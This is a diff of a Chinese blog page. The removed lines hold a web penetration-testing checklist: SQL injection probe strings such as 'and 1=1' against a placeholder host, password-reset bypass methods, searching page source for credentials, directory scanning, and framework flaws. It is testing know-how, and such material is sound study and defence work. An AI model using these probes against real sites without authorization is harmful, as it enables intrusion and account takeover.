-<li>由于有些HTML元素（比如<code>&lt;textarea&gt;</code>或”）会影响脚本的执行，所以不一定能够正确弹出123456告警框，需要根据返回网页源文件的内容，构造value的值</li>
-</ul>
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><strong>测试方法：</strong></p>
-<p>通过web漏洞扫描工具进行对网站爬虫后得到的所有链接进行检测，或者手工判断是否存在注入点，一旦确认存在漏洞，可利用自动化工具sqlmap去尝试注入。几种常见的判断方法：</p>
-<ul>
-<li>数字型：<a target="_blank" rel="noopener" href="http://host/test.php?id=100">http://host/test.php?id=100</a> and 1=1 返回成功<a target="_blank" rel="noopener" href="http://host/test.php?id=100">http://host/test.php?id=100</a> and 1=2 返回失败</li>
-<li>字符型：<a target="_blank" rel="noopener" href="http://host/test.php?name=rainman">http://host/test.php?name=rainman</a> ’ and ‘1’=‘1 返回成功<a target="_blank" rel="noopener" href="http://host/test.php?name=rainman">http://host/test.php?name=rainman</a> ’ and ‘1’=‘2 返回失败</li>
-<li>搜索型：搜索型注入：简单的判断搜索型注入漏洞是否存在的办法是：先搜索（’），如果出错，说明90%存在这个漏洞。然后搜索（%），如果正常返回，说明95%有洞了。然后再搜索一个关键字，比如2006，正常返回所有2006相关的信息。再搜索（2006%‘and 1=1 and ‘%’=’）和（2006%‘and 1=2 and ‘%’=’）</li>
-<li>或者直接登录框输入用户名的后面输入’看是否报数据库错误 </li>
-</ul>
-<h3 id="任意用户密码修改-重置"><a href="#任意用户密码修改-重置" class="headerlink" title="任意用户密码修改/重置"></a>任意用户密码修改/重置</h3><p>  <strong>测试方法：</strong></p>
-<p>密码修改的步骤一般是先校验用户原始密码是否正确，再让用户输入新密码。修改密码机制绕过方式大概有以下三种：</p>
-<ul>
-<li>如果输入新密码的接口可以直接访问，那么在未知原始密码的的情况下即可直接修改密码，通常知道了他人的用户名即可任意修改他人的密码。</li>
-<li>如果系统未校验修改密码的用户身份，那么在提交修改密码请求时，攻击者通过输入密码，将用户名或者用户ID修改为其他人的，即可成功修改他人的密码。</li>
-<li>当修改密码时系统需要电子邮件或者手机短信确认，而应用程序未校验用户输入的邮箱和手机号，那么攻击者通过填写自己的邮箱或手机号接收修改密码的链接和验证码，以此修改他人的密码。</li>
-</ul>
-<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>  <strong>测试方法：</strong></p>
-<ul>
-<li>可以找一下页面源码、JS文件，全局搜索password,userlogin等一些敏感词等可能存在意想不到的收获</li>
-<li>找到账号密码验证成功后跳转的URL地址，然后尝试访问此地址，看是否出现未授权访问漏洞</li>
-<li>网页源码中已显示账号密码验证成功后的跳转地址，直接访问此地址看是否可以未授权访问。</li>
-</ul>
-<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>  <strong>测试方法：</strong></p>
-<ul>
-<li>可以利用御剑或者其他一些攻击扫描web应用进行检测，也可通过搜索，网站标题包含“index of”关键词的网站进行访问。</li>
-</ul>
-<h3 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h3><p>  <strong>测试方法：</strong></p>
-<ul>
-<li>常见的一些shiro、struts2等等，通过网上的一些辅助脚本去进行测试</li>
-</ul>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/7msTGUSXPD1IMTSySZRnLw">https://mp.weixin.qq.com/s/7msTGUSXPD1IMTSySZRnLw</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1978,7 +2021,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">84</span>
+          <span class="site-state-item-count">85</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
